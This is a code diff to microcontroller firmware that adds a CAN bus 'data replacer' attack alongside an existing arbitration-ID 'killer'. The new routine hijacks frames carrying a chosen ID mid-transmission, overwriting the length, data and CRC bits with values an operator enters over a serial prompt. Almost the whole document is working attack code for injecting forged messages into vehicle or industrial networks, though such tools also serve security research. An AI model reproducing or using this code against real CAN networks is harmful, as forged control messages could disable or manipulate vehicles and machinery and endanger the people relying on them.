@@ -37,6 +37,11 @@ static volatile uint8_t synchronized = 0;
 
 static volatile uint8_t tx_bit_count = 0;
 
+static uint8_t data_replacer_len = 0;
+static uint8_t data_replacer_len_bits = 0;
+static uint8_t data_replacer_data[8];
+static uint16_t data_replacer_crc;
+
 const uint32_t TIMER_PERIOD_NS = 50;
 
 /**************************************
@@ -494,14 +499,12 @@ GPIOA->ODR |= GPIO_PIN_4;
     TIM4->DIER |= TIM_IT_UPDATE;
     TIM4->CR1 |= TIM_CR1_CEN;
 
-    /* Start the timer that fires on each CAN edge if an attack is configured */
-    if(timer3_callback_handler != NULL)
-    {
-        TIM3->ARR = can_ticks_per_cycle - can_edge_interrupt_delay;
-        TIM3->CNT = 0;
-        TIM3->DIER |= TIM_IT_UPDATE;
-        TIM3->CR1 |= TIM_CR1_CEN;
-    }
+    /* Start the timer that fires on each CAN edge */
+    TIM3->SR = ~TIM_IT_UPDATE;
+    TIM3->ARR = can_ticks_per_cycle - can_edge_interrupt_delay;
+    TIM3->CNT = 0;
+    TIM3->DIER |= TIM_IT_UPDATE;
+    TIM3->CR1 |= TIM_CR1_CEN;
 
     /* Set the ARR back to the correct value */
 GPIOA->ODR &= ~GPIO_PIN_4;
@@ -585,3 +588,91 @@ void install_arbid_killer()
 {
     timer3_callback_handler = arbid_killer;
 }
+
+static void data_replacer()
+{
+    uint8_t bit = 1;
+    /* We're going to key off the bit-keeping that we're doing in the 
+     * sample_callback function in order to see where we are in the message and
+     * to track any necessary bit stuffing. These variables are:
+     *
+     * same_bits_count - the number of same bits in a row we have seen on the bus
+     * bits_read - the number of bits we have read
+     * arbid - the current arbitration ID
+     * last_bit - value of the last bit read on the bus
+     */
+
+    /* Check to see if we have received an arbitration ID and it matches the one we are attacking */
+    if((bits_read >= 12) && (arbid == attack_arbid))
+    {
+        /* Check to see if we need to send a stuff bit */
+        if(same_bits_count == 5)
+        {
+            bit = last_bit ^ 0x01;
+        }
+        /* Let the current transmitter send the RTR, IDE and reserved bits, then take over at the DLC */
+        else if(bits_read >= 15 && bits_read <= 18)
+        {
+            bit = (data_replacer_len >> (18 - bits_read)) & 0x1;
+        }
+        /* Send the data */
+        else if((bits_read >= 19) && (bits_read < (19 + data_replacer_len_bits)))
+        {
+            bit = data_replacer_data[(bits_read - 19) >> 3] >> (7 - ((bits_read - 19) & 0x7));
+        }
+        /* Send the CRC */
+        else if((bits_read >= (19 + data_replacer_len_bits)) && (bits_read < (34 + data_replacer_len_bits)))
+        {
+            bit = (data_replacer_crc >> (33 + data_replacer_len_bits - bits_read)) & 0x1;
+        }
+        /* Send the CRC delimiter, ACK slot, ACK delimiter, and EOF */
+        else if(bits_read >= 34 + data_replacer_len_bits)
+        {
+            bit = 1;
+        }
+
+        /* Set the calculated level */
+        if(bit == 1)
+            GPIOB->ODR |= GPIO_PIN_13;
+        else
+            GPIOB->ODR &= ~GPIO_PIN_13;
+     }
+}
+
+void install_data_replacer()
+{
+    do
+    {
+        write_string("Data length: ");
+        data_replacer_len = read_int();
+        if(data_replacer_len > 8)
+            write_string("Invalid length entered\r\n");
+    } while(data_replacer_len > 8);
+    data_replacer_len_bits = data_replacer_len * 8;
+
+    for(int i = 0; i < data_replacer_len; i++)
+    {
+        write_string("Byte ");
+        write_int(i);
+        write_string(": 0x");
+        data_replacer_data[i] = read_hex() & 0xFF;
+    }
+
+    data_replacer_crc = can_crc(attack_arbid, 0, 0, data_replacer_len, data_replacer_data);
+
+    write_string("Replacing Arbid 0x");
+    write_int(attack_arbid);
+    write_string(" with data:");
+    for(int i = 0; i < data_replacer_len; i++)
+    {
+        write_string(" 0x");
+        write_int(data_replacer_data[i]);
+    }
+    write_string(" CRC: 0x");
+    write_int(data_replacer_crc);
+    write_string("\r\n");
+ 
+    timer3_callback_handler = data_replacer;
+}
+
+
